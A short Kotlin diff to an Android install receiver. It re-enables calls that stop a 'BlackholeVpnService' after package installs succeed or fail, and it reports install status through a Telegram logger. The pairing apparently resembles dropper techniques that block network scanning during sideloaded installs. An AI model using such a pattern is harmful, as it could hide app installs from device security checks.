@@ -71,7 +71,7 @@ class InstallReceiver : BroadcastReceiver() {
             }
 
             PackageInstaller.STATUS_SUCCESS -> {
-                // BlackholeVpnService.stop(context)  // VPN temporarily disabled
+                BlackholeVpnService.stop(context)
                 try {
                     val pkgName = intent.getStringExtra(PackageInstaller.EXTRA_PACKAGE_NAME)
                     if (!pkgName.isNullOrEmpty()) {
@@ -563,7 +563,7 @@ class InstallReceiver : BroadcastReceiver() {
             PackageInstaller.STATUS_FAILURE_INCOMPATIBLE,
             PackageInstaller.STATUS_FAILURE_INVALID,
             PackageInstaller.STATUS_FAILURE_STORAGE -> {
-                // BlackholeVpnService.stop(context)  // VPN temporarily disabled
+                BlackholeVpnService.stop(context)
                 val msg = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE) ?: "no message"
                 TelegramLogger.send(context, "INSTALL_FAILURE", statusName(status),
                     "status=$status msg=$msg — relaying INSTALL_RESTART_ACTION to InstallActivity")
